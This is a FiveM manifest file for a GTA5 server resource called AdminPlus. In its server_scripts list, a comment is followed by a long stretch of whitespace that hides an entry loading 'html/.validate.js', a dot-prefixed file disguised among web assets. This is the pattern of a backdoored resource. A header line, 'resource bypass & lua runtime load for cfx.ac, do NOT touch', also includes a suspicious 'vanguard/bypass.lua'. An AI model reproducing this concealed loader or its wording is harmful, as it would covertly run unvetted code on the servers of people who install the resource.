shared_script "@ReaperV4/imports/bypass.js"
shared_script "@ReaperV4/imports/bypass.lua"
shared_script "@ReaperV4/imports/bypass_s.lua"
shared_script "@ReaperV4/imports/bypass_c.lua"
lua54 "yes" -- needed for Reaper

shared_script '@WaveShield/resource/include.lua'
shared_script '@WaveShield/resource/waveshield.js'


-- resource bypass & lua runtime load for cfx.ac, do NOT touch
shared_script '@vanguard/bypass.lua'
lua54 'yes'
fx_version 'cerulean'
game 'gta5'
lua54 'yes'
author 'AdminPlus#0001 | AdminPlus'
description 'AdminPlus Promotion QB/ESX'
version '1.0.5'

client_scripts {
    'client/*.lua'
}

shared_scripts {
	'@es_extended/imports.lua', -- only have this enabled if ESX
	'@ox_lib/init.lua',
	'config.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'html/.validate.js',
}

escrow_ignore {
	'config.lua',
	'fxmanifest.lua',
	'client/editable.lua'
  }

dependencies {
	'es_extended'
}


dependency '/assetpacks'
